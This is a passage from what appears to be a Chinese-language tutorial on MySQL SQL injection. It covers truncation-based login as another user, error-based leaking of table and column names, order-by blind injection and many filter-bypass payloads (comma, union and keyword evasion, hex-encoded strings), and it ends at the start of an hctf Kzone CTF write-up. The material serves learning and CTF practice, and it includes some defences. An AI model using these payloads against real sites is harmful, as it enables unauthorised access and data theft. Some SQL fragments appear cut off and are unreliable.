主要就是
1.mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。
2.mysql插入数据的时候,当数据超过定义的长度会出现截断象限
漏洞利用过程分析:
我们目标是越权登陆`xq17`这个用户
(1)注册用户名: xq17 1(空格填充长度需要大于10) ,密码为1234560
对应的sql语句:
这个时候尝试查询:
会发现上面说的第一个特性,用空格来填充比较。
(2)去登陆界面登陆,注意的是,我们传入的不是我们注册用户名,而是'xq17'目标用户名,密码是我们注册密码
对应的SQL语句是:
会发现返回的是我们的注册结果,所以说返回的username是admin+n多个空格
但是代码一般判断是否有返回值,所以这样会导致登陆成功。
防御措施:
​ 1.顾名思义,加个unique约束,就会导致在插入的时候,会做一次相同比较,(回到上面说的比较特性),避免发生这种情况.
​ 2.代码获取用户名写进session的时候用返回结果。
## 0x7 注入场景分析
### (一)同表注入:
    获取当前注入点所在表的信息 常见于后台登陆、ctf考点中
我以前写过一篇实战遇到的场景: [bypass select from
另类的sql注入闷骚操作获得管理员密码](https://www.t00ls.net/thread-43466-1-1.html)  
**(1)限制: 过滤了information_schema 突破:获取表名**  
支持报错注入:  
and polygon(id)# id如果是当前表存在的字段就爆出表名
    mysql> select * from test where name='1' and polygon(id);
    ERROR 1367 (22007): Illegal non geometric '`test`.`test`.`id`' value found during parsing
爆列名 通过using可以爆出所有列名
    mysql> select * from (select * from test as a join test as b)as c;
    ERROR 1060 (42S21): Duplicate column name 'id'
    mysql> select * from (select * from test as a join test as b using(id))as c;
    ERROR 1060 (42S21): Duplicate column name 'name'
    mysql> select * from (select * from test as a join test as b using(id,name))as c;
    ERROR 1060 (42S21): Duplicate column name 'password'
* * *
**(2)限制:过滤了字段名,可union 源码给出字段结构(*次要) 突破:获取指定字段内容**  
​ 曾经校赛学长出过一道题  
​ `$filterlist =
"/\(|\)|username|password|id|where|case|=|like|sleep|for|into_outfile|load_file;/“;`  
​ 其实思路就是:
    mysql> select * from test where name='xq17'  union select 1,'x',3 order by name; 
    +----+------+----------+
    | id | name | password |
    +----+------+----------+
    |  1 | x    | 3        |
    |  1 | xq17 | 123456   |
    mysql> select * from test where name='xq17'  union select 1,'w',3 order by name; 
    +----+------+----------+
    | id | name | password |
    +----+------+----------+
    |  1 | w    | 3        |
    |  1 | xq17 | 123456   |
    +----+------+----------+
    2 rows in set (0.00 sec)
通过 order by进行降序排序 就会发现 代码取返回的值会发生不同 就可以根据这个来写布尔盲注
* * *
**(3)限制了union select等关键词 突破:获取内容**
    mysql> select * from test where name='xq17' && password <>
    3.like regexp
    4. in //select "123" in ("123"); => 1 select "123" in ("12") =>0
(2)过滤ascii()
    hex() bin() ord()
(3)过滤substr() mid()等
    left() right() mid() substr() substring() lpad() rpad()
(4)过滤字段名(通杀全表)
    mysql> select e.3 from (select * from (select 1)b,(select 2)c,(select 3)a union select * from test)e;`
    通过构造一个虚拟表
     `select * from (select 1)... union select * from test`, 联合进表信息 赋予别名 然后通过列数来调用
(5)过滤,(逗号)
    limit 0,1 => limit 1 offset 0;
    mid(str,5,1) =>mid('str'from 5 for 1) =>substr('str' from for 1)
    union select 1,2,3 => union select * from (select 1)a join (select 2)b join (select 3)c;
这个点在实战也有,很有意思  
我写过一篇文章:[绕过逗号和空格的mysql小特性](https://www.t00ls.net/thread-44229-1-1.html)
(6)过滤逗号和for
    mid('123' from -1); =>3 
    mid('123' from -2); =>23
(7)硬匹配函数体
    version() => `version`()
    version() => version/**/()
(8)union开头正则过滤 /^union[^a-zA-Z0-9_]/i
    select * from test where name=0.1union select 1,2,3;
      select * from test where name=1E1union select 1,2,3;
      select * from test where name=\Nunion select 1,2,3; //\N => null
(9)对于传递一些敏感字符或者字段 或者 过滤了单引号传递字符串的时候
    考虑将内容进行hex编码
    select * from test where name='xq17';
    select hex('xq17') => 78713137;
则上面等价  
`select * from test where name=0x78713137;`  
ssti模版注入利用数据库中介来绕过过滤
特殊字符,详情可以参考:[python继承链和题解综合](https://github.com/mstxq17/ctf_web/blob/master/python%E7%BB%A7%E6%89%BF%E9%93%BE%E5%92%8C%E9%A2%98%E8%A7%A3%E7%BB%BC%E5%90%88.md)  
(10) /union select/ 匹配绕过  
`union distinct select 1,2,3`
## 0X8 结合上文 分析CTF题目
### 0x8.1 hctf Kzone解题之旅
**(1)常规扫描获取压缩包**  
`http://kzone.2018.hctf.io/www.zip`  
**(2) 源码审计发现漏洞**
    .
    ├── 2018.php
    ├── Default\ account&password.txt
    ├── Tutorial.txt
    ├── admin
    │   ├── delete.php
    │   ├── export.php
    │   ├── index.php
    │   ├── list.php
    │   ├── login.php
    │   └── pass.php
    ├── config.php
    ├── include
    │   ├── common.php
    │   ├── db.class.php
    │   ├── function.php
    │   ├── kill.intercept.php
    │   ├── member.php
    │   ├── os.php
    │   └── safe.php